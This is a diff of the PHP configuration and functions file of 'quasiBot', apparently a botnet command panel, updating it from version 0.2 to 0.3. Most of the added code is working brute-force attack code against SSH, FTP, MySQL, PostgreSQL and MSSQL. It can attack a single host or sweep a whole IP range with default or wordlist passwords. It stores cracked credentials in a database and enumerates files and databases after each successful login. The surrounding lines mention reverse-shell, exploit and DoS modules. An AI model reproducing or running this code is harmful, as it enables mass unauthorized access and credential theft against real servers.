@@ -2,18 +2,9 @@
 
 /*
 
-quasiBot 0.2 - config file
+quasiBot 0.3 - config file
 
-Todo:
- - Windows support in 'PWN' module
- - Automatic attacks on servers
- - Optimization
- - ???
-
- 0.2 Changelog:
- - Added authorization system (Sessions / Cookie Auth)
- - Added Shell Module (Spawn reverse shell / bind shell)
- - Added Exploit Suggestor module
+https://github.com/Smaash/quasibot
 
  ~ smash[at]devilteam.pl
 
@@ -45,6 +36,7 @@ define('NMAP', '/usr/bin/nmap'); // Nmap executable for Scan module
 define('CHECKSQL', 1); //Determine whenever mysql connection should be checked
 define('PWN_PHP_METHOD', 'system'); //Determine php function being used in PWN and Shell module
 
+
 //Functions
 
 function checksql() {
@@ -54,6 +46,7 @@ if(!$conn) {
 	die('Could not connect to sql - '.mysql_error());
 } else {
 if (!mysql_select_db(SQL_DB)) {
+    echo('[+] Looks like you\'re running quasi for first time! Enjoy.<br />');
     echo('[+] Creating database '.SQL_DB.'<br />');
     mysql_query('CREATE DATABASE '.SQL_DB);
     mysql_select_db(SQL_DB);
@@ -61,6 +54,7 @@ if (!mysql_select_db(SQL_DB)) {
 if(mysql_num_rows(mysql_query('SHOW TABLES LIKE "bots"'))!=1) {
 	echo '[+] Creating tables';
 	mysql_query('CREATE TABLE bots(id MEDIUMINT NOT NULL AUTO_INCREMENT, url CHAR(200) NOT NULL, PRIMARY KEY (id))');
+    mysql_query('CREATE TABLE brute(id MEDIUMINT NOT NULL AUTO_INCREMENT, service CHAR(50) NOT NULL, credentials CHAR(255) NOT NULL, PRIMARY KEY (id))');
 }
 }
 mysql_close($conn);
@@ -75,14 +69,14 @@ function auth() {
     session_regenerate_id();
 
     if(!isset($_SESSION['user'])) {
-        header('Location: login.php');
+        header('Location: ../index.php');
     }
 
     if(isset($_GET['logout'])) {
         session_start();
         unset($_SESSION['user']);
         session_destroy();
-        header('Location: login.php');
+        header('Location: ../index.php');
     }
 
     }
@@ -415,7 +409,7 @@ echo '</div></div>';
 }
 
 function quotes() {
-$quotes=array("&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;  <font size='1' color='gray'>Anthony J. D'Angelo</font>","&quot;The difference between stupidity and genius is that genius has its limits&quot;  <font size='1' color='gray'>Albert Einstein</font>","&quot;As a young boy, I was taught in high school that hacking was cool.&quot;  <font size='1' color='gray'>Kevin Mitnick</font>", "&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;  <font size='1' color='gray'>Steve Wozniak</font>","&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;  <font size='1' color='gray'>Cory Doctorow</font>", "&quot;It’s hardware that makes a machine fast. It’s software that makes a fast machine slow.&quot;  <font size='1' color='gray'>Craig Bruce</font>", "&quot;The function of good software is to make the complex appear to be simple.&quot;  <font size='1' color='gray'>Grady Booch</font>", "&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Tell me what you need and I'll tell you how to get along without it.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Fuck shit up!&quot;  <font size='1' color='gray'>Smash</font>", "&quot;Once we accept our limits, we go beyond them.&quot; <font size='1' color='gray'>Albert Einstein</font>", "&quot;Listen to many, speak to a few.&quot; <font size='1' color='gray'>William Shakespeare</font>", "&quot;The robbed that smiles, steals something from the thief.&quot; <font size='1' color='gray'>William Shakespeare</font>");
+$quotes=array("&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;  <font size='1' color='gray'>Anthony J. D'Angelo</font>","&quot;The difference between stupidity and genius is that genius has its limits&quot;  <font size='1' color='gray'>Albert Einstein</font>","&quot;As a young boy, I was taught in high school that hacking was cool.&quot;  <font size='1' color='gray'>Kevin Mitnick</font>", "&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;  <font size='1' color='gray'>Steve Wozniak</font>","&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;  <font size='1' color='gray'>Jamie Zawinski</font>", "&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;  <font size='1' color='gray'>Cory Doctorow</font>", "&quot;It’s hardware that makes a machine fast. It’s software that makes a fast machine slow.&quot;  <font size='1' color='gray'>Craig Bruce</font>", "&quot;The function of good software is to make the complex appear to be simple.&quot;  <font size='1' color='gray'>Grady Booch</font>", "&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Tell me what you need and I'll tell you how to get along without it.&quot;  <font size='1' color='gray'>Anonymous</font>", "&quot;Hmm..&quot;  <font size='1' color='gray'>Smash</font>", "&quot;Once we accept our limits, we go beyond them.&quot; <font size='1' color='gray'>Albert Einstein</font>", "&quot;Listen to many, speak to a few.&quot; <font size='1' color='gray'>William Shakespeare</font>", "&quot;The robbed that smiles, steals something from the thief.&quot; <font size='1' color='gray'>William Shakespeare</font>");
 $quote = $quotes[array_rand($quotes)];
 echo '<p>'.$quote.'</p>';
 }
@@ -800,6 +794,31 @@ echo '<br /><p>Attacked '.$_POST['url'].' for '.$_POST['time']. ' seconds with <
 
 }
 
+function rss($feed) {
+    $rss = new DOMDocument();
+    $rss->load($feed);
+    $feed = array();
+    foreach ($rss->getElementsByTagName('item') as $node) {
+    $item = array (
+    'title' => $node->getElementsByTagName('title')->item(0)->nodeValue,
+    'desc' => $node->getElementsByTagName('description')->item(0)->nodeValue,
+    'link' => $node->getElementsByTagName('link')->item(0)->nodeValue,
+    'date' => $node->getElementsByTagName('pubDate')->item(0)->nodeValue,
+    );
+    array_push($feed, $item);
+    }
+    $limit = 10;
+    for($x=0;$x<$limit;$x++) {
+    $title = str_replace(' & ', ' &amp; ', $feed[$x]['title']);
+    $link = $feed[$x]['link'];
+    $description = $feed[$x]['desc'];
+    $date = date('d.m.y', strtotime($feed[$x]['date']));
+    echo '<p><strong><a href="'.$link.'" title="'.$title.'">'.$title.'</a></strong><br />';
+    echo '<small><em>Published '.$date.'</em></small></p>';
+    echo '<p>'.$description.'</p>';
+    }
+}
+
 function dos() {
 
     if(isset($_POST['url1']) && isset($_POST['botid1']) && isset($_POST['time1']) && isset($_POST['sup'])) {
@@ -1133,6 +1152,769 @@ foreach($exploits as $exploit) {
 }
 
 }
+
+function showbrute() {
+
+$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysql_select_db(SQL_DB, $conn);
+
+$ftp = 0;
+$ssh = 0;
+$dbs = 0;
+$www = 0;
+
+$data = mysql_query("SELECT * FROM `brute`") or die("Shits fuckd up - ".mysql_error());
+echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
+echo '<tr><td><b>ID</b></td><td><b>HOST</b></td><td><b>USER</b></td><td><b>PASS</b></td></tr>';
+while($row = mysql_fetch_assoc($data)) {
+
+$x = explode(':', $row["credentials"]);
+$y = explode(':', $row["service"]);
+
+if($y[1] == '22') {
+    $ssh++;
+}
+elseif($y[1] == '21') {
+    $ftp++;
+}
+elseif($y[1] == '3306' || $y[1] == '1433' || $y[1] == '5432') {
+    $dbs++;
+}
+elseif($y[1] == '80') {
+    $www++;
+}
+    
+echo '<tr><td>'.$row["id"].'.</td><td>'.$row["service"].'</td><td>'.$x[0].'</td><td>'.$x[1].'</td></tr>';
+}
+echo '</table>';
+echo '<br /><center>ftp - '.$ftp.' &nbsp;&bull;&nbsp; ssh - '.$ssh.' &nbsp;&bull;&nbsp; dbs - '.$dbs.' &nbsp;&bull;&nbsp; www - '.$www.'</center>';
+
+}
+
+function brute_ssh() {
+
+$passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
+$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysql_select_db(SQL_DB, $conn);
+
+    if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
+
+
+    echo '<div class="post">';
+    echo '<h2 class="title"><a href="#">Results</a></h2>';
+    echo '<div class="entry">';
+    echo '<p class="meta"> Single SSH attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
+    if(isset($_POST['wordlist']) == 1) {
+        echo 'yes</p>';
+    } else {
+        echo 'no</p>';
+    }
+
+       if($checkssh = fsockopen($_POST['shost'], 22, $errno, $errstr, 5)) {
+        echo '<b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - SSH found on port 22.<br /><br />';
+
+        if($_POST['wordlist'] == 1) {
+
+            if(file_exists($_POST['spath'])) {
+                $pwds = file($_POST['spath']);
+            } else {
+                echo '<p>File not found... Using default passwords.</p>';
+                $pwds = $passes;
+            }
+
+        } else {
+            $pwds = $passes;
+        }
+
+        
+
+        
+        foreach ($pwds as $haslo){
+          $sshconn = ssh2_connect($_POST['shost'], 22);
+          if(ssh2_auth_password($sshconn, $_POST['suser'], trim($haslo))) {
+        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":22', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
+        ssh2_exec($sshconn, 'exit');
+          } else {
+        echo " - <font color=\"#990000\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . "</font><br />";
+          }
+
+        }
+        
+
+
+
+        } else { 
+        echo '<b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - SSH seems not working (22).';
+        }
+
+
+    echo '</div></div>';
+
+    }
+
+    elseif(isset($_POST['mhost']) && isset($_POST['mpath']) && isset($_POST['muser'])) {
+
+    echo '<div class="post">';
+    echo '<h2 class="title"><a href="#">Results</a></h2>';
+    echo '<div class="entry">';
+    echo '<p class="meta"> Massive SSH attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
+    if(isset($_POST['wordlist']) == 2) {
+        echo 'yes</p>';
+    } else {
+        echo 'no</p>';
+    }
+
+    $ips = explode('-', $_POST['mhost']);
+
+    for($ip = ip2long($ips[0]); $ip <= ip2long($ips[1]); $ip++) {
+
+               if($checkssh = fsockopen(long2ip($ip), 22, $errno, $errstr, 5)) {
+        echo '<br /><b>&raquo;</b> <b>'.long2ip($ip).'</b> - SSH found on port 22.<br /><br />';
+
+        if($_POST['wordlist'] == 2) {
+
+            if(file_exists($_POST['mpath'])) {
+                $pwds = file($_POST['mpath']);
+            } else {
+                echo '<p>File not found... Using default passwords.</p>';
+                $pwds = $passes;
+            }
+
+        } else {
+            $pwds = $passes;
+        }
+
+        foreach ($pwds as $haslo){
+
+            $sshconn = ssh2_connect(long2ip($ip), 22);
+
+          if(ssh2_auth_password($sshconn, $_POST['muser'], trim($haslo)))
+          {
+        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":22', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
+        ssh2_exec($sshconn, 'exit');
+        break;
+          } else {
+        echo " - <font color=\"#990000\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . "</font><br />";
+          }
+
+        }
+        
+        } else { 
+            echo '<br /><b>&raquo;</b> <b>'.long2ip($ip).'</b> - SSH seems not working (22).<br />';
+        }
+
+    }
+
+    echo '</div></div>';
+
+    }
+
+mysql_close($conn);
+
+}
+
+function brute_ftp() {
+
+$passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
+$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysql_select_db(SQL_DB, $conn);
+
+    if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
+
+
+    echo '<div class="post">';
+    echo '<h2 class="title"><a href="#">Results</a></h2>';
+    echo '<div class="entry">';
+    echo '<p class="meta"> Single FTP attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
+    if(isset($_POST['wordlist']) == 1) {
+        echo 'yes</p>';
+    } else {
+        echo 'no</p>';
+    }
+
+       if($checkftp = fsockopen($_POST['shost'], 21, $errno, $errstr, 5)) {
+        echo '<br /><b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - FTP found on port 21.<br />';
+
+        if($_POST['wordlist'] == 1) {
+
+            if(file_exists($_POST['spath'])) {
+                $pwds = file($_POST['spath']);
+            } else {
+                echo '<p>File not found... Using default passwords.</p>';
+                $pwds = $passes;
+            }
+
+        } else {
+            $pwds = $passes;
+        }
+
+        $ftpconn = ftp_connect($_POST['shost']);
+        if(ftp_login($ftpconn, 'anonymous', '')) {
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', 'anonymous')", $conn);
+        ssh2_exec($sshconn, 'exit');
+            echo '<br /><font color="#009900">Anonymous login allowed!</font><br />';
+            echo '<p>Files in directory '.ftp_pwd($ftpconn).' :</p> ';
+            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
+            foreach ($ftpfiles as $plik) {
+                echo $plik.'<br />';
+            }
+            ftp_close($ftpconn);
+        } else {
+            echo '<br /><p>FTP anonymous login not allowed.<p/>';
+            ftp_close($ftpconn);
+        }
+
+
+      if($_POST['suser'] != '') {
+                echo '<br /><p>Bruteforcing...</p>'; 
+                foreach ($pwds as $haslo){
+                    $ftpconn = ftp_connect($_POST['shost']);
+                        if(ftp_login($ftpconn, $_POST['suser'], $haslo)) {
+        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
+        ssh2_exec($sshconn, 'exit');            echo '<p>General info</p>';
+            echo '<p>Current directory -</p> '.ftp_pwd($ftpconn).'<br />';
+            echo '<p>Files in directory:</p> <br />';
+            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
+            foreach ($ftpfiles as $plik) {
+            echo $plik.'<br />';
+            }
+             ftp_close($ftpconn);
+             break;
+                        } else {
+        echo " - <font color=\"#990000\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . "</font><br />";
+                        }
+                }
+        } else {
+            echo '<p>FTP user is not defined, wont bruteforce.</p>';
+        }
+
+        } else { 
+        echo '<b>&raquo;</b> <b>'.htmlspecialchars($_POST['shost']).'</b> - FTP seems not working (21).';
+        }
+
+
+    echo '</div></div>';
+
+    }
+
+    elseif(isset($_POST['mhost']) && isset($_POST['mpath']) && isset($_POST['muser'])) {
+
+    echo '<div class="post">';
+    echo '<h2 class="title"><a href="#">Results</a></h2>';
+    echo '<div class="entry">';
+    echo '<p class="meta"> Massive FTP attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
+    if(isset($_POST['wordlist']) == 2) {
+        echo 'yes</p>';
+    } else {
+        echo 'no</p>';
+    }
+
+    $ips = explode('-', $_POST['mhost']);
+
+    for($ip = ip2long($ips[0]); $ip <= ip2long($ips[1]); $ip++) {
+               if($checkftp = fsockopen(long2ip($ip), 21, $errno, $errstr, 5)) {
+        echo '<br /><b>&raquo;</b> <b>'.htmlspecialchars(long2ip($ip)).'</b> - FTP found on port 21.<br />';
+
+        if($_POST['wordlist'] == 1) {
+
+            if(file_exists($_POST['spath'])) {
+                $pwds = file($_POST['spath']);
+            } else {
+                echo '<p>File not found... Using default passwords.</p>';
+                $pwds = $passes;
+            }
+
+        } else {
+            $pwds = $passes;
+        }
+
+        $ftpconn = ftp_connect(long2ip($ip));
+
+      if($_POST['muser'] != '') {
+                echo '<p>Bruteforcing...</p>'; 
+                foreach ($pwds as $haslo){
+                    $ftpconn = ftp_connect(long2ip($ip));
+                        if(ftp_login($ftpconn, $_POST['muser'], $haslo)) {
+        echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
+        ssh2_exec($sshconn, 'exit');            echo '<p>General info</p>';
+            echo '<p>Current directory -</p> '.ftp_pwd($ftpconn).'<br />';
+            echo '<p>Files in directory:</p> <br />';
+            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
+            foreach ($ftpfiles as $plik) {
+            echo $plik.'<br />';
+            }
+             ftp_close($ftpconn);
+             break;
+                        } else {
+        echo " - <font color=\"#990000\">" . htmlspecialchars(long2ip($ip)) . ':' . htmlspecialchars($haslo) . "</font><br />";
+                        }
+                }
+        } else {
+            echo '<p>FTP user is not defined, wont bruteforce.</p>';
+        }
+
+        if(ftp_login($ftpconn, 'anonymous', '')) {
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', 'anonymous')", $conn);
+        ssh2_exec($sshconn, 'exit');
+            echo '<br /><font color="#009900">Anonymous login allowed!</font><br />';
+            echo '<p>Files in directory '.ftp_pwd($ftpconn).' :</p> ';
+            $ftpfiles = ftp_rawlist($ftpconn, ftp_pwd($ftpconn));
+            foreach ($ftpfiles as $plik) {
+                echo $plik.'<br />';
+            }
+            ftp_close($ftpconn);
+        } else {
+            echo '<p>FTP anonymous login not allowed.<p/>';
+            ftp_close($ftpconn);
+        }
+
+    }
+}
+
+    echo '</div></div>';
+
+    }
+
+mysql_close($conn);
+
+}
+
+function brute_dbs() {
+
+$passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
+$connf = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysql_select_db(SQL_DB, $connf);
+
+    if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
+
+    echo '<div class="post">';
+    echo '<h2 class="title"><a href="#">Results</a></h2>';
+    echo '<div class="entry">';
+    echo '<p class="meta"> Single Database attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
+    if(isset($_POST['wordlist']) == 1) {
+        echo 'yes &nbsp;&bull;&nbsp; ';
+    } else {
+        echo 'no &nbsp;&bull;&nbsp; ';
+    }
+    echo 'Target: ';
+    if(isset($_POST['smysql'])) {
+        echo 'MySQL ';
+    }
+    if(isset($_POST['smssql'])) {
+        echo 'MsSQL ';
+    }
+    if(isset($_POST['spgsql'])) {
+        echo 'PgSQL ';
+    } elseif(!isset($_POST['smysql']) && !isset($_POST['smssql']) && !isset($_POST['spgsql'])) {
+        echo 'None selected';
+        $none = TRUE;
+    }
+
+        if($_POST['wordlist'] == 1) {
+
+            if(file_exists($_POST['spath'])) {
+                $pwds = file($_POST['spath']);
+            } else {
+                echo '<p>File not found... Using default passwords.</p>';
+                $pwds = $passes;
+            }
+
+        } else {
+            $pwds = $passes;
+        }
+
+    echo '<br /><h3>&raquo; '.htmlspecialchars($_POST['shost']).'</h3>';
+
+
+    if(isset($_POST['smysql'])) {
+
+        $checksql = fsockopen($_POST['shost'], 3306, $errno, $errstr, 5);
+            if($checksql){
+        echo '<br /><p><b>[+]</b> MySql found on port 3306. Bruteforcing...</p>';
+
+        if($_POST['suser'] == '') {
+        $uzytkownik = 'root';
+        } else {
+        $uzytkownik = $_POST['suser'];
+        }
+
+        foreach ($pwds as $haslo){
+        $conn = mysql_connect($_POST['shost'], $uzytkownik, $haslo);
+            if ($conn)  {
+        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+
+        $dbuser = mysql_query("SELECT USER();");
+        $dbuzer = mysql_fetch_row($dbuser);
+        $dbdb = mysql_query("SELECT DATABASE();");
+        $dbd = mysql_fetch_row($dbdb);
+        echo '<b>General info</b><br />';
+        echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
+        echo 'Host info - '.mysql_get_host_info().'<br />';
+        echo 'Current user - '.$dbuzer[0].'<br />';
+
+        echo '<br /><b>Databases</b><br />';
+        $res = mysql_query("SHOW DATABASES");
+
+    while ($row = mysql_fetch_assoc($res)) {
+        echo $row['Database'] . "<br />";
+    }
+
+        mysql_close($conn);
+        break;
+            } else {
+        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
+        }
+        }
+
+    
+    } else {
+        echo '<p><b>[-]</b> MySql seems not working (3306).</p>';
+    }
+
+    }
+
+    if(isset($_POST['spgsql'])) {
+
+        $checksql = fsockopen($_POST['shost'], 5432, $errno, $errstr, 5);
+            if($checksql){
+        echo '<br /><p><b>[+]</b> PgSql found on port 5432. Bruteforcing...</p>';
+
+        if($_POST['suser'] == '') {
+        $uzytkownik = 'postgres';
+        } else {
+        $uzytkownik = $_POST['suser'];
+        }
+
+        foreach ($pwds as $haslo){
+        $conn = pg_connect("host=".$_POST['shost']." user=".$uzytkownik." password=".$haslo);
+            if ($conn)  {
+        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        echo '<br /><b>General info</b><br />';
+        echo 'Version - '.pg_version($conn).'<br />';
+        echo 'Host - '.pg_host($conn).'<br />';
+        pg_close($conn);
+        break;
+            } else {
+        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
+        }
+        }
+
+    
+    } else {
+        echo '<p><b>[-]</b> PgSql seems not working (5432).</p>';
+    }
+
+    }
+
+        if(isset($_POST['smssql'])) {
+
+        $checksql = fsockopen($_POST['shost'], 1433, $errno, $errstr, 5);
+            if($checksql){
+        echo '<br /><p><b>[+]</b> MsSql found on port 1433. Bruteforcing...</p>';
+
+        if($_POST['suser'] == '') {
+        $uzytkownik = 'sa';
+        } else {
+        $uzytkownik = $_POST['suser'];
+        }
+
+        foreach ($pwds as $haslo){
+        $conn = mssql_connect($_POST['shost'], $uzytkownik, $haslo);
+            if ($conn)  {
+        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mssql_close($conn);
+        break;
+            } else {
+        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
+        }
+        }
+
+    
+    } else {
+        echo '<p><b>[-]</b> MsSql seems not working (1433).</p>';
+    }
+
+    }
+
+    echo '</div></div>';
+
+    }
+
+    if(isset($_POST['mhost']) && isset($_POST['mpath']) && isset($_POST['muser'])) {
+
+    echo '<div class="post">';
+    echo '<h2 class="title"><a href="#">Results</a></h2>';
+    echo '<div class="entry">';
+    echo '<p class="meta"> Massive Database\'s attack &nbsp;&bull;&nbsp; Broken credentials will be stored in database &nbsp;&bull;&nbsp; Using wordlist - ';
+    if(isset($_POST['wordlist']) == 2) {
+        echo 'yes &nbsp;&bull;&nbsp; ';
+    } else {
+        echo 'no &nbsp;&bull;&nbsp; ';
+    }
+    echo 'Target: ';
+    if(isset($_POST['mmysql'])) {
+        echo 'MySQL ';
+    }
+    if(isset($_POST['mmssql'])) {
+        echo 'MsSQL ';
+    }
+    if(isset($_POST['mpgsql'])) {
+        echo 'PgSQL ';
+    } elseif(!isset($_POST['mmysql']) && !isset($_POST['mmssql']) && !isset($_POST['mpgsql'])) {
+        echo 'None selected';
+        $none = TRUE;
+    }
+
+        if($_POST['wordlist'] == 1) {
+
+            if(file_exists($_POST['spath'])) {
+                $pwds = file($_POST['spath']);
+            } else {
+                echo '<p>File not found... Using default passwords.</p>';
+                $pwds = $passes;
+            }
+
+        } else {
+            $pwds = $passes;
+        }
+
+    $ips = explode('-', $_POST['mhost']);
+
+    for($ip = ip2long($ips[0]); $ip <= ip2long($ips[1]); $ip++) {
+
+       echo '<br /><h3>&raquo; '.htmlspecialchars(long2ip($ip)).'</h3>';
+
+
+    if(isset($_POST['mmysql'])) {
+
+        $checksql = fsockopen(long2ip($ip), 3306, $errno, $errstr, 5);
+            if($checksql){
+        echo '<br /><p><b>[+]</b> MySql found on port 3306. Bruteforcing...</p>';
+
+        if($_POST['muser'] == '') {
+        $uzytkownik = 'root';
+        } else {
+        $uzytkownik = $_POST['muser'];
+        }
+
+        foreach ($pwds as $haslo){
+        $conn = mysql_connect(long2ip($ip), $uzytkownik, $haslo);
+            if ($conn)  {
+        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+
+        $dbuser = mysql_query("SELECT USER();");
+        $dbuzer = mysql_fetch_row($dbuser);
+        $dbdb = mysql_query("SELECT DATABASE();");
+        $dbd = mysql_fetch_row($dbdb);
+        echo '<b>General info</b><br />';
+        echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
+        echo 'Host info - '.mysql_get_host_info().'<br />';
+        echo 'Current user - '.$dbuzer[0].'<br />';
+
+        echo '<br /><b>Databases</b><br />';
+        $res = mysql_query("SHOW DATABASES");
+
+    while ($row = mysql_fetch_assoc($res)) {
+        echo $row['Database'] . "<br />";
+    }
+
+        mysql_close($conn);
+        break;
+            } else {
+        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
+        }
+        }
+
+    
+    } else {
+        echo '<p><b>[-]</b> MySql seems not working (3306).</p>';
+    }
+
+    }
+
+    if(isset($_POST['mpgsql'])) {
+
+        $checksql = fsockopen(long2ip($ip), 5432, $errno, $errstr, 5);
+            if($checksql){
+        echo '<br /><p><b>[+]</b> PgSql found on port 5432. Bruteforcing...</p>';
+
+        if($_POST['muser'] == '') {
+        $uzytkownik = 'postgres';
+        } else {
+        $uzytkownik = $_POST['muser'];
+        }
+
+        foreach ($pwds as $haslo){
+        $conn = pg_connect("host=".long2ip($ip)." user=".$uzytkownik." password=".$haslo);
+            if ($conn)  {
+        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        echo '<br /><b>General info</b><br />';
+        echo 'Version - '.pg_version($conn).'<br />';
+        echo 'Host - '.pg_host($conn).'<br />';
+        pg_close($conn);
+        break;
+            } else {
+        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
+        }
+        }
+
+    
+    } else {
+        echo '<p><b>[-]</b> PgSql seems not working (5432).</p>';
+    }
+
+    }
+
+        if(isset($_POST['mmssql'])) {
+
+        $checksql = fsockopen(long2ip($ip), 1433, $errno, $errstr, 5);
+            if($checksql){
+        echo '<br /><p><b>[+]</b> MsSql found on port 1433. Bruteforcing...</p>';
+
+        if($_POST['muser'] == '') {
+        $uzytkownik = 'sa';
+        } else {
+        $uzytkownik = $_POST['muser'];
+        }
+
+        foreach ($pwds as $haslo){
+        $conn = mssql_connect(long2ip($ip), $uzytkownik, $haslo);
+            if ($conn)  {
+        echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
+        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mssql_close($conn);
+        break;
+            } else {
+        echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
+        }
+        }
+
+    
+    } else {
+        echo '<p><b>[-]</b> MsSql seems not working (1433).</p>';
+    }
+
+    }
+
+    }
+
+    echo '</div></div>';
+
+    }
+    mysql_close($conn);
+}
+
+function url_exists($strURL)
+{
+    $resURL = curl_init();
+    if(USE_PROXY == 1) {
